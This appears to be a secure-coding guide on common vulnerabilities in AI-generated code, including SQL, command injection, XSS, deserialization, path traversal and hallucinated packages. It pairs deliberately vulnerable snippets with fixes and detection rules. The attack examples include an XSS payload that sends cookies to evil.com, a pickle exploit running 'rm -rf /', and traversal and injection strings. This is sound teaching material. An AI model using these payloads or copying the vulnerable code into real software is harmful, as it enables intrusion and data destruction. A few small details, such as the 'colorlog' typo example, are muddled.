# Common Vulnerabilities in AI-Generated Code

## Overview

This document provides real-world examples of vulnerabilities commonly found in AI-generated code, with detailed explanations and secure alternatives.

---

## Table of Contents
1. [SQL Injection](#1-sql-injection-cwe-89)
2. [OS Command Injection](#2-os-command-injection-cwe-78)
3. [Cross-Site Scripting (XSS)](#3-cross-site-scripting-xss-cwe-79)
4. [Hard-coded Credentials](#4-hard-coded-credentials-cwe-798)
5. [Insecure Deserialization](#5-insecure-deserialization-cwe-502)
6. [Path Traversal](#6-path-traversal-cwe-22)
7. [Insecure Cryptography](#7-insecure-cryptography-cwe-327328330)
8. [Missing Authentication](#8-missing-authentication-cwe-306)
9. [IDOR](#9-insecure-direct-object-reference-idor-cwe-639)
10. [Slopsquatting](#10-slopsquatting-package-hallucination)

---

## 1. SQL Injection (CWE-89)

**Prevalence:** Found in ~25% of AI-generated database code

### Vulnerable Code (AI-Generated)

```python
# VULNERABLE: String formatting in SQL query
def get_user(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return db.execute(query)

# VULNERABLE: Concatenation
def search_products(category):
    query = "SELECT * FROM products WHERE category = '" + category + "'"
    return db.execute(query)

# VULNERABLE: % formatting
def get_order(order_id):
    query = "SELECT * FROM orders WHERE id = %s" % order_id
    return db.execute(query)
```

### Attack Example
```
Input: admin' OR '1'='1' --
Query becomes: SELECT * FROM users WHERE username = 'admin' OR '1'='1' --'
Result: Returns all users, bypassing authentication
```

### Secure Code

```python
# SECURE: Parameterized query (SQLite)
def get_user(username):
    query = "SELECT * FROM users WHERE username = ?"
    return db.execute(query, (username,))

# SECURE: Parameterized query (PostgreSQL/psycopg2)
def get_user(username):
    query = "SELECT * FROM users WHERE username = %s"
    cursor.execute(query, (username,))
    return cursor.fetchone()

# SECURE: Using ORM (SQLAlchemy)
def get_user(username):
    return User.query.filter_by(username=username).first()

# SECURE: Using ORM (Django)
def get_user(username):
    return User.objects.get(username=username)
```

### Why AI Gets This Wrong
- Training data contains legacy code patterns
- String formatting is simpler to generate
- AI optimizes for "working" not "secure"

---

## 2. OS Command Injection (CWE-78)

**Prevalence:** Common in system administration scripts

### Vulnerable Code (AI-Generated)

```python
# VULNERABLE: os.system with user input
def ping_host(hostname):
    os.system(f"ping -c 1 {hostname}")

# VULNERABLE: subprocess with shell=True
def list_files(directory):
    subprocess.call(f"ls -la {directory}", shell=True)

# VULNERABLE: os.popen
def get_disk_usage(path):
    return os.popen(f"du -sh {path}").read()
```

### Attack Example
```
Input: example.com; cat /etc/passwd
Command becomes: ping -c 1 example.com; cat /etc/passwd
Result: Attacker reads sensitive system files
```

### Secure Code

```python
import subprocess
import shlex
import re

# SECURE: subprocess with shell=False and argument list
def ping_host(hostname):
    # Validate hostname format
    if not re.match(r'^[a-zA-Z0-9.-]+$', hostname):
        raise ValueError("Invalid hostname format")

    # Use argument list, not string
    result = subprocess.run(
        ['ping', '-c', '1', hostname],
        shell=False,
        capture_output=True,
        text=True,
        timeout=10
    )
    return result.stdout

# SECURE: Using shlex for complex cases
def list_files(directory):
    # Validate path
    if not os.path.isdir(directory):
        raise ValueError("Invalid directory")

    real_path = os.path.realpath(directory)
    if not real_path.startswith('/allowed/path/'):
        raise ValueError("Access denied")

    result = subprocess.run(
        ['ls', '-la', real_path],
        shell=False,
        capture_output=True,
        text=True
    )
    return result.stdout
```

### Why AI Gets This Wrong
- `os.system()` is simpler than subprocess
- AI often forgets `shell=False`
- Input validation requires domain knowledge

---

## 3. Cross-Site Scripting (XSS) (CWE-79)

**Prevalence:** Found in 20-30% of AI-generated web code

### Vulnerable Code (AI-Generated)

```javascript
// VULNERABLE: Direct HTML insertion
app.get('/search', (req, res) => {
    res.send(`<h1>Results for: ${req.query.q}</h1>`);
});

// VULNERABLE: innerHTML
function displayMessage(message) {
    document.getElementById('output').innerHTML = message;
}

// VULNERABLE: React dangerouslySetInnerHTML
function Comment({ text }) {
    return <div dangerouslySetInnerHTML={{__html: text}} />;
}
```

### Attack Example
```
Input: <script>document.location='http://evil.com/steal?c='+document.cookie</script>
Result: Victim's cookies sent to attacker
```

### Secure Code

```javascript
// SECURE: Use HTML escaping
const escapeHtml = require('escape-html');

app.get('/search', (req, res) => {
    const safeQuery = escapeHtml(req.query.q);
    res.send(`<h1>Results for: ${safeQuery}</h1>`);
});

// SECURE: Use textContent instead of innerHTML
function displayMessage(message) {
    document.getElementById('output').textContent = message;
}

// SECURE: React default behavior (already escapes)
function Comment({ text }) {
    return <div>{text}</div>;  // Safe - React escapes by default
}

// SECURE: If HTML needed, sanitize first
const DOMPurify = require('dompurify');

function RichComment({ html }) {
    const clean = DOMPurify.sanitize(html);
    return <div dangerouslySetInnerHTML={{__html: clean}} />;
}
```

### Python/Flask Example

```python
# VULNERABLE
@app.route('/greet')
def greet():
    name = request.args.get('name')
    return f'<h1>Hello, {name}!</h1>'

# SECURE: Use Jinja2 templating (auto-escapes)
@app.route('/greet')
def greet():
    name = request.args.get('name')
    return render_template('greet.html', name=name)

# greet.html: <h1>Hello, {{ name }}!</h1>
```

---

## 4. Hard-coded Credentials (CWE-798)

**Prevalence:** Found in 10-15% of AI-generated code

### Vulnerable Code (AI-Generated)

```python
# VULNERABLE: Hardcoded database credentials
DATABASE_URL = "postgresql://admin:secretpassword@db.example.com:5432/production"

# VULNERABLE: Hardcoded API keys
API_KEY = "sk-1234567890abcdefghijklmnop"
STRIPE_SECRET = "sk_live_abcdef123456"

# VULNERABLE: Hardcoded JWT secret
JWT_SECRET = "super-secret-jwt-key-do-not-share"

# VULNERABLE: Hardcoded encryption key
ENCRYPTION_KEY = b'0123456789abcdef'
```

### Why This Happens
- AI provides "working" examples with placeholder values
- Training data includes code with exposed secrets
- Developers copy AI output without modification

### Secure Code

```python
import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# SECURE: Environment variables
DATABASE_URL = os.environ.get('DATABASE_URL')
API_KEY = os.environ.get('API_KEY')
JWT_SECRET = os.environ.get('JWT_SECRET')

# Validate required variables
required_vars = ['DATABASE_URL', 'API_KEY', 'JWT_SECRET']
missing = [v for v in required_vars if not os.environ.get(v)]
if missing:
    raise EnvironmentError(f"Missing required environment variables: {missing}")

# SECURE: For encryption keys, use proper key derivation
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import secrets

def derive_key(password: str, salt: bytes = None) -> tuple:
    if salt is None:
        salt = secrets.token_bytes(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=480000,
    )
    key = kdf.derive(password.encode())
    return key, salt
```

### .env.example (Commit this, not .env)
```
DATABASE_URL=postgresql://user:password@localhost:5432/dbname
API_KEY=your-api-key-here
JWT_SECRET=generate-a-random-secret
```

---

## 5. Insecure Deserialization (CWE-502)

**Prevalence:** Common in Python code

### Vulnerable Code (AI-Generated)

```python
# VULNERABLE: pickle with untrusted data
import pickle

def load_user_data(data):
    return pickle.loads(data)  # Arbitrary code execution!

# VULNERABLE: yaml.load (before safe_load)
import yaml

def parse_config(yaml_string):
    return yaml.load(yaml_string)  # Can execute Python code!
```

### Attack Example
```python
# Attacker creates malicious pickle
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('rm -rf /',))

payload = pickle.dumps(Exploit())
# When victim calls pickle.loads(payload), command executes
```

### Secure Code

```python
# SECURE: Use JSON for untrusted data
import json

def load_user_data(data):
    return json.loads(data)  # Safe, only parses JSON

# SECURE: Use safe_load for YAML
import yaml

def parse_config(yaml_string):
    return yaml.safe_load(yaml_string)

# SECURE: If pickle absolutely necessary, use RestrictedUnpickler
import pickle
import io

class RestrictedUnpickler(pickle.Unpickler):
    ALLOWED_CLASSES = {
        ('collections', 'OrderedDict'),
        ('datetime', 'datetime'),
    }

    def find_class(self, module, name):
        if (module, name) in self.ALLOWED_CLASSES:
            return super().find_class(module, name)
        raise pickle.UnpicklingError(f"Forbidden class: {module}.{name}")

def safe_pickle_loads(data):
    return RestrictedUnpickler(io.BytesIO(data)).load()
```

---

## 6. Path Traversal (CWE-22)

**Prevalence:** Common in file handling code

### Vulnerable Code (AI-Generated)

```python
# VULNERABLE: Direct file access with user input
@app.route('/download')
def download():
    filename = request.args.get('file')
    return send_file(f'/uploads/{filename}')

# VULNERABLE: File read without validation
def read_log(log_name):
    with open(f'/var/log/{log_name}', 'r') as f:
        return f.read()
```

### Attack Example
```
Input: ../../../etc/passwd
Path becomes: /uploads/../../../etc/passwd
Resolves to: /etc/passwd
Result: Attacker reads sensitive system files
```

### Secure Code

```python
import os
from werkzeug.utils import secure_filename
from pathlib import Path

UPLOAD_DIR = Path('/uploads').resolve()

@app.route('/download')
def download():
    filename = request.args.get('file')

    # Step 1: Sanitize filename
    safe_filename = secure_filename(filename)
    if not safe_filename:
        abort(400, "Invalid filename")

    # Step 2: Construct full path
    file_path = UPLOAD_DIR / safe_filename

    # Step 3: Resolve to absolute and verify it's within allowed directory
    try:
        resolved = file_path.resolve()
        if not str(resolved).startswith(str(UPLOAD_DIR)):
            abort(403, "Access denied")
    except (ValueError, RuntimeError):
        abort(400, "Invalid path")

    # Step 4: Check file exists
    if not resolved.is_file():
        abort(404, "File not found")

    return send_file(resolved)
```

---

## 7. Insecure Cryptography (CWE-327/328/330)

**Prevalence:** Found in 25-40% of AI-generated crypto code

### Vulnerable Code (AI-Generated)

```python
# VULNERABLE: MD5 for password hashing
import hashlib

def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()

# VULNERABLE: SHA1 for security purposes
def generate_token(user_id):
    return hashlib.sha1(f"{user_id}{time.time()}".encode()).hexdigest()

# VULNERABLE: ECB mode for encryption
from Crypto.Cipher import AES

def encrypt(data, key):
    cipher = AES.new(key, AES.MODE_ECB)  # ECB is insecure!
    return cipher.encrypt(data)

# VULNERABLE: Hardcoded IV
def encrypt_secure(data, key):
    iv = b'0000000000000000'  # Never use static IV!
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(data)

# VULNERABLE: Using random instead of secrets
import random

def generate_api_key():
    return ''.join(random.choices('abcdef0123456789', k=32))
```

### Secure Code

```python
# SECURE: bcrypt for password hashing
import bcrypt

def hash_password(password: str) -> bytes:
    return bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

def verify_password(password: str, hashed: bytes) -> bool:
    return bcrypt.checkpw(password.encode(), hashed)

# SECURE: Proper token generation
import secrets

def generate_token() -> str:
    return secrets.token_urlsafe(32)  # Cryptographically secure

# SECURE: AES-GCM with random nonce
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

def encrypt(data: bytes, key: bytes) -> tuple:
    nonce = os.urandom(12)  # Random nonce for each encryption
    aesgcm = AESGCM(key)
    ciphertext = aesgcm.encrypt(nonce, data, None)
    return nonce, ciphertext

def decrypt(nonce: bytes, ciphertext: bytes, key: bytes) -> bytes:
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(nonce, ciphertext, None)

# SECURE: Proper random for security
import secrets

def generate_api_key() -> str:
    return secrets.token_hex(32)  # Cryptographically secure
```

---

## 8. Missing Authentication (CWE-306)

### Vulnerable Code (AI-Generated)

```python
# VULNERABLE: No authentication
@app.route('/api/admin/users')
def list_users():
    return jsonify(User.query.all())

# VULNERABLE: Authentication but no authorization
@app.route('/api/users/<user_id>/delete', methods=['DELETE'])
@login_required  # User is logged in, but are they allowed?
def delete_user(user_id):
    User.query.filter_by(id=user_id).delete()
    return jsonify({'status': 'deleted'})
```

### Secure Code

```python
from functools import wraps

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not current_user.is_authenticated:
            return jsonify({'error': 'Authentication required'}), 401
        if not current_user.is_admin:
            return jsonify({'error': 'Admin access required'}), 403
        return f(*args, **kwargs)
    return decorated

# SECURE: Proper authentication and authorization
@app.route('/api/admin/users')
@admin_required
def list_users():
    return jsonify([u.to_dict() for u in User.query.all()])

# SECURE: Authorization check for resource access
@app.route('/api/users/<user_id>/delete', methods=['DELETE'])
@login_required
def delete_user(user_id):
    # Check if user can delete this account
    if not (current_user.is_admin or current_user.id == user_id):
        return jsonify({'error': 'Not authorized'}), 403

    user = User.query.get_or_404(user_id)
    db.session.delete(user)
    db.session.commit()
    return jsonify({'status': 'deleted'})
```

---

## 9. Insecure Direct Object Reference (IDOR) (CWE-639)

### Vulnerable Code (AI-Generated)

```python
# VULNERABLE: No ownership check
@app.route('/api/documents/<doc_id>')
@login_required
def get_document(doc_id):
    doc = Document.query.get(doc_id)
    return jsonify(doc.to_dict())

# VULNERABLE: Sequential IDs make enumeration easy
@app.route('/api/invoices/<invoice_id>')
@login_required
def get_invoice(invoice_id):
    invoice = Invoice.query.get(invoice_id)
    return jsonify(invoice.to_dict())
```

### Attack Example
```
Attacker changes doc_id from 1001 to 1002, 1003, etc.
Result: Access to other users' documents
```

### Secure Code

```python
import uuid

# SECURE: Verify ownership
@app.route('/api/documents/<doc_id>')
@login_required
def get_document(doc_id):
    doc = Document.query.get_or_404(doc_id)

    # Check ownership
    if doc.owner_id != current_user.id:
        abort(403)

    return jsonify(doc.to_dict())

# SECURE: Use UUIDs instead of sequential IDs
class Invoice(db.Model):
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    # ...

# SECURE: Include user in query
@app.route('/api/invoices/<invoice_id>')
@login_required
def get_invoice(invoice_id):
    invoice = Invoice.query.filter_by(
        id=invoice_id,
        user_id=current_user.id  # Always filter by user
    ).first_or_404()
    return jsonify(invoice.to_dict())
```

---

## 10. Slopsquatting (Package Hallucination)

**This is unique to AI-generated code!**

### The Problem

AI can suggest packages that don't exist:
```python
# AI might generate this
from flask_authenticate import login_required  # Package doesn't exist!
import colorlog  # Typo - should be colorlog, but maybe AI said colorlogger
```

### Attack Scenario
1. AI suggests `flask-authenticate` (doesn't exist)
2. Attacker registers `flask-authenticate` on PyPI
3. Developer runs `pip install flask-authenticate`
4. Malicious code executes

### Prevention

```bash
# Before installing ANY AI-suggested package:

# 1. Check if package exists
pip show flask-authenticate 2>&1 | grep -q "not found" && echo "DOES NOT EXIST!"

# 2. Check PyPI directly
curl -s https://pypi.org/pypi/flask-authenticate/json | jq '.info.name' || echo "NOT FOUND"

# 3. Check package age and downloads
pip download flask-authenticate --no-deps -d /tmp 2>&1
# New packages with few downloads are suspicious

# 4. Use a verification script
```

### Package Verification Script

```python
#!/usr/bin/env python3
"""Verify AI-suggested packages before installation."""

import requests
import sys
from datetime import datetime, timedelta

def verify_package(package_name: str) -> dict:
    """Check if a package is safe to install."""
    results = {
        'exists': False,
        'downloads': 0,
        'age_days': 0,
        'warnings': []
    }

    # Check PyPI
    url = f"https://pypi.org/pypi/{package_name}/json"
    response = requests.get(url)

    if response.status_code == 404:
        results['warnings'].append("CRITICAL: Package does not exist on PyPI!")
        return results

    data = response.json()
    results['exists'] = True

    # Check age
    releases = data.get('releases', {})
    if releases:
        first_release = min(releases.keys())
        release_info = releases[first_release]
        if release_info:
            upload_time = release_info[0].get('upload_time', '')
            if upload_time:
                created = datetime.fromisoformat(upload_time.replace('Z', '+00:00'))
                age = datetime.now(created.tzinfo) - created
                results['age_days'] = age.days

                if age < timedelta(days=30):
                    results['warnings'].append(f"WARNING: Package is only {age.days} days old")

    # Check downloads (requires pypistats API)
    try:
        stats = requests.get(f"https://pypistats.org/api/packages/{package_name}/recent")
        if stats.status_code == 200:
            results['downloads'] = stats.json().get('data', {}).get('last_month', 0)
            if results['downloads'] < 1000:
                results['warnings'].append(f"WARNING: Low download count ({results['downloads']})")
    except:
        pass

    return results

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: verify_package.py <package_name>")
        sys.exit(1)

    result = verify_package(sys.argv[1])
    print(f"Package: {sys.argv[1]}")
    print(f"Exists: {result['exists']}")
    print(f"Age: {result['age_days']} days")
    print(f"Downloads (last month): {result['downloads']}")

    if result['warnings']:
        print("\nWarnings:")
        for w in result['warnings']:
            print(f"  - {w}")
        sys.exit(1)
    else:
        print("\n✓ Package appears safe")
```

---

## Summary: Detection Patterns

### Regex Patterns for Quick Detection

```bash
# SQL Injection
grep -rn "execute.*f['\"]" --include="*.py"
grep -rn "execute.*%" --include="*.py"

# Command Injection
grep -rn "os\.system\|subprocess.*shell=True" --include="*.py"

# Hardcoded Secrets
grep -rn "password\s*=\s*['\"]" --include="*.py"
grep -rn "api_key\s*=\s*['\"]" --include="*.py"

# Insecure Crypto
grep -rn "md5\|sha1" --include="*.py"
grep -rn "MODE_ECB" --include="*.py"

# Dangerous Functions
grep -rn "eval\|exec\|pickle\.loads" --include="*.py"

# XSS (JavaScript)
grep -rn "innerHTML\s*=" --include="*.js"
grep -rn "dangerouslySetInnerHTML" --include="*.jsx" --include="*.tsx"
```

### SAST Rule Examples (Semgrep)

```yaml
rules:
  - id: ai-sql-injection
    patterns:
      - pattern-either:
          - pattern: $DB.execute(f"...")
          - pattern: $DB.execute("..." % ...)
          - pattern: $DB.execute("..." + ...)
    message: "Potential SQL injection - use parameterized queries"
    languages: [python]
    severity: ERROR

  - id: ai-command-injection
    patterns:
      - pattern-either:
          - pattern: os.system(...)
          - pattern: subprocess.$FUNC(..., shell=True, ...)
    message: "Potential command injection - use subprocess with shell=False"
    languages: [python]
    severity: ERROR
```

---

## References

- [CWE Top 25](https://cwe.mitre.org/top25/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [Semgrep Rules Registry](https://semgrep.dev/r)
